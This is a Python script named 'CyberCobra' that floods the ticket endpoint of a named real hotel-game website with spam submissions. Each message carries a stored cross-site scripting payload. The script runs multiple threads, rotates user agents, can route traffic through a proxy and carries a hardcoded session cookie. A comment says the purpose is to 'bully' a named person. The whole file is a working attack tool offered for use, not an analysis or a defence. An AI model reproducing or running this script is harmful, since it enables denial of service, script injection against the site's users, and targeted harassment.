# Bot Name: CyberCobra
# Credits: Milan
# Description: This tool was made to exploit the ticket controller vulnerability in Mezz 2.5+ versions.

import requests
import threading
import time
import random
import sys
import signal
import argparse
import logging
import json
import os

url = "https://plex-hotel.nl/App/Controllers/ticket?userid=98" # Url just add the url of the website like https://google.com
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.999 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.999 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15"
]

PROXIES = [
    "http://50.174.7.153:80"  # This is a working proxy 
]

total_successful_requests = 0  # Just keep this at this number.
total_requests = 0  # Added to keep track of total requests made.
lock = threading.Lock()
stop_event = threading.Event()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s') 

def send_request(bot_id, rate_per_minute, use_proxy, retry_attempts, retry_delay):
    global total_successful_requests, total_requests
    headers = {
        "Accept": "text/html, */*; q=0.01",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "on=1; PHPSESSID=el0o28vlhhg9cp2rlf07qqf870",  # Just add your PHP Session ID in here otherwise you can not bully Kenji.
        "Host": "plex-hotel.nl", # Just the domain name
        "Referer": "https://plex-hotel.nl/", # Hotel url
        "Sec-Ch_Ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "Sec-Ch_Ua-Mobile": "?0",
        "Sec-Ch_Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": random.choice(USER_AGENTS),
        "X-Requested-With": "XMLHttpRequest"
    }

    proxies = None
    if use_proxy:
        proxies = {
            "http": random.choice(PROXIES)
        }

    delay = 60 / rate_per_minute

    while not stop_event.is_set():
        data = {
            "topic": f"Message spam bot {bot_id} <script>alert('test this xss exploit')</script>",
            "primacy": "high"
        }
        for attempt in range(retry_attempts):
            try:
                response = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=10)
                with lock:
                    total_requests += 1
                update_pid('bot.pid')
                if response.status_code == 200:
                    with lock:
                        total_successful_requests += 1
                    update_pid('bot.pid')
                    logging.info(f"Bot {bot_id} status code: {response.status_code} with message: {data['topic']} to the ticket controller.")
                    break
                else:
                    logging.error(f"Bot {bot_id} status code: {response.status_code} with message: {data['topic']} encountered an error.")
            except Exception as e:
                logging.error(f"Bot {bot_id} encountered an error: {e}")
            time.sleep(retry_delay)
        time.sleep(delay)

def signal_handler(sig, frame):
    logging.info("Signal received, stopping bots...")
    stop_event.set()

def load_config(config_file):
    with open(config_file, 'r') as f:
        return json.load(f)

def save_pid(pid_file):
    with open(pid_file, 'w') as f:
        f.write(f"{os.getpid()}\n{total_requests}\n{total_successful_requests}")

def read_pid(pid_file):
    with open(pid_file, 'r') as f:
        lines = f.read().strip().split('\n')
        return int(lines[0]), int(lines[1]), int(lines[2])

def update_pid(pid_file):
    with open(pid_file, 'r') as f:
        lines = f.readlines()
    lines[1] = f"{total_requests}\n"
    lines[2] = f"{total_successful_requests}\n"
    with open(pid_file, 'w') as f:
        f.writelines(lines)

def main():
    parser = argparse.ArgumentParser(description="Advanced Bot Script By Milan")
    parser.add_argument('--config', type=str, required=True, help="Path to the configuration file")
    parser.add_argument('--start', action='store_true', help="Start the bot system")
    parser.add_argument('--stop', action='store_true', help="Stop the bot system")
    parser.add_argument('--status', action='store_true', help="Get the status of the bot system")
    args = parser.parse_args()

    if args.stop:
        if os.path.exists('bot.pid'):
            with open('bot.pid', 'r') as f:
                pid = int(f.read().strip().split('\n')[0])
                os.kill(pid, signal.SIGTERM)
            os.remove('bot.pid')
            logging.info("Bot system stopped.")
        else:
            logging.error("No bot system is currently running.")
        return

    if args.status:
        if os.path.exists('bot.pid'):
            pid, total_requests, total_successful_requests = read_pid('bot.pid')
            logging.info(f"Bot system is running with PID: {pid}")
            logging.info(f"Total requests made: {total_requests}")
            logging.info(f"Total successful requests: {total_successful_requests}")
        else:
            logging.info("No bot system is currently running.")
        return

    if not args.start:
        parser.print_help()
        return

    config = load_config(args.config)

    num_bots = config.get("num_bots", 10)
    rate_per_minute = config.get("rate_per_minute", 60)
    use_proxy = config.get("use_proxy", False)
    retry_attempts = config.get("retry_attempts", 3)
    retry_delay = config.get("retry_delay", 5)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    save_pid('bot.pid')

    threads = []
    try:
        for i in range(num_bots):
            t = threading.Thread(target=send_request, args=(i + 1, rate_per_minute, use_proxy, retry_attempts, retry_delay))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()
    except KeyboardInterrupt:
        stop_event.set()
        logging.info("Terminating...")

    for t in threads:
        t.join()

    if os.path.exists('bot.pid'):
        os.remove('bot.pid')

    logging.info(f"All bots completed their tasks. Total successful tickets made: {total_successful_requests}")

if __name__ == "__main__":
    main()